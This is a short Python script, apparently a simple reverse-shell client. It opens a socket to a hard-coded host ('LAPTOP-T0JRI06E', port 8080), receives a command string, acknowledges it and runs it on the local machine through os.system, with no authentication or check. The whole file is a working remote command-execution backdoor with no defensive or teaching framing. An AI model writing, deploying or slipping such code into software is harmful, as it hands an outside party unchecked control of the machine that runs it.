import time
import sys
import socket
import os

#Connect to host
s = socket.socket()
host = "LAPTOP-T0JRI06E"
port = 8080
s.connect((host,port))
print("Connected to the server.")

#Recieve command from host
command = s.recv(1024)
command = command.decode()
print(command)
s.send("Command recieved".encode())

#Execute command
time.sleep(5)
os.system(command)
